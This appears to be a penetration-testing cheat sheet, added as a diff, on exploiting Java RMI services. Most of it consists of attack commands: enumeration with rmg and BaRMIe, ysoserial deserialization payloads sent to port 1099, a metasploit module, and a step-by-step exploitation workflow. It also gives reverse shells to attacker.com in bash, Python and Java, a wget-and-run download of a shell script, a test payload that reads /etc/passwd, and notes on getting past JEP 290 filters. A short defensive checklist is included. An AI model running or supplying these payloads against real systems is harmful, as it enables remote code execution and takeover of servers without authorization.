@@ -1,0 +1,217 @@
+# Java RMI Exploitation
+
+## ========================================
+## DEFAULT PORTS
+## ========================================
+
+1099 - RMI Registry
+1098 - RMI Activation System
+Various - RMI Server ports (dynamic)
+
+## ========================================
+## DETECTION
+## ========================================
+
+# Nmap scan
+nmap -sV -p 1099 target.com
+nmap -sV -p 1098 target.com
+
+# Banner grabbing
+nc target.com 1099
+
+## ========================================
+## ENUMERATION
+## ========================================
+
+# List RMI services
+rmg enum target.com 1099
+
+# Using BaRMIe
+java -jar BaRMIe.jar -attack target.com 1099
+
+## ========================================
+## DESERIALIZATION ATTACKS
+## ========================================
+
+# Using ysoserial
+java -jar ysoserial.jar CommonsCollections6 "whoami" | nc target.com 1099
+
+# Gadget chains
+CommonsCollections1
+CommonsCollections2
+CommonsCollections3
+CommonsCollections4
+CommonsCollections5
+CommonsCollections6
+CommonsCollections7
+Groovy1
+Spring1
+Spring2
+
+## ========================================
+## EXPLOITATION WITH YSOSERIAL
+## ========================================
+
+# Generate payload
+java -jar ysoserial.jar CommonsCollections6 "calc.exe"
+
+# Send to RMI
+java -jar ysoserial.jar CommonsCollections6 "calc.exe" | xxd -p | tr -d "\\n" | xargs -I {} echo "Payload: {}"
+
+## ========================================
+## BARMIE EXPLOITATION
+## ========================================
+
+# Enumerate and attack
+java -jar BaRMIe.jar -attack target.com 1099
+
+# Specific gadget
+java -jar BaRMIe.jar -attack target.com 1099 -payload CommonsCollections6 -command "whoami"
+
+## ========================================
+## JMXRMI ATTACKS
+## ========================================
+
+# JMX over RMI
+java -jar beanshooter.jar enum target.com 1099
+
+# Deploy MBean
+java -jar beanshooter.jar deploy target.com 1099 tonka-bean.jar
+
+## ========================================
+## REMOTE METHOD INVOCATION
+## ========================================
+
+# Call remote methods
+# Custom RMI client needed
+
+# Example Java code:
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+Registry registry = LocateRegistry.getRegistry("target.com", 1099);
+RemoteInterface stub = (RemoteInterface) registry.lookup("ServiceName");
+stub.vulnerableMethod(maliciousObject);
+
+## ========================================
+## CVE EXPLOITS
+## ========================================
+
+# CVE-2017-3241 - RMI Registry Bypass
+# CVE-2019-2725 - WebLogic RCE
+# CVE-2020-14645 - WebLogic RCE
+
+## ========================================
+## TOOLS
+## ========================================
+
+# ysoserial
+java -jar ysoserial.jar [payload] [command]
+
+# BaRMIe
+java -jar BaRMIe.jar -attack target.com 1099
+
+# rmg (Remote Method Guesser)
+rmg enum target.com 1099
+rmg guess target.com 1099
+rmg call target.com 1099 method
+
+# beanshooter
+java -jar beanshooter.jar enum target.com 1099
+
+# metasploit
+use exploit/multi/misc/java_rmi_server
+set RHOSTS target.com
+set RPORT 1099
+exploit
+
+## ========================================
+## ENUMERATION TECHNIQUES
+## ========================================
+
+# List bound names
+rmg enum target.com 1099
+
+# Guess methods
+rmg guess target.com 1099
+
+# Scan for known gadgets
+rmg scan target.com 1099
+
+## ========================================
+## EXPLOITATION WORKFLOW
+## ========================================
+
+# 1. Detect RMI service
+nmap -sV -p 1099 target.com
+
+# 2. Enumerate services
+rmg enum target.com 1099
+
+# 3. Identify gadgets
+rmg scan target.com 1099
+
+# 4. Generate payload
+java -jar ysoserial.jar CommonsCollections6 "nc -e /bin/sh attacker.com 4444"
+
+# 5. Exploit
+java -jar BaRMIe.jar -attack target.com 1099 -payload CommonsCollections6 -command "reverse_shell"
+
+## ========================================
+## REVERSE SHELL PAYLOADS
+## ========================================
+
+# Bash
+bash -i >& /dev/tcp/attacker.com/4444 0>&1
+
+# Python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+# Java
+Runtime.getRuntime().exec("nc -e /bin/sh attacker.com 4444")
+
+## ========================================
+## COMMON VULNERABILITIES
+## ========================================
+
+# Unauthenticated access
+# Deserialization vulnerabilities
+# Method invocation without authorization
+# Information disclosure
+# Code execution
+
+## ========================================
+## DEFENSIVE TESTING
+## ========================================
+
+# Verify:
+- RMI not exposed to internet
+- Authentication enabled
+- Updated JDK (deserialize filters)
+- JEP 290 protections active
+- Firewall rules in place
+- TLS encryption enabled
+
+## ========================================
+## PAYLOADS FOR TESTING
+## ========================================
+
+# Command execution
+whoami
+id
+cat /etc/passwd
+uname -a
+
+# Reverse shell
+bash -i >& /dev/tcp/ATTACKER/PORT 0>&1
+
+# Download and execute
+wget http://attacker.com/shell.sh -O /tmp/s.sh && bash /tmp/s.sh
+
+## ========================================
+## MITIGATION BYPASS
+## ========================================
+
+# Bypass JEP 290 filters (if weak)
+# Use alternative gadget chains
+# Chain multiple vulnerabilities
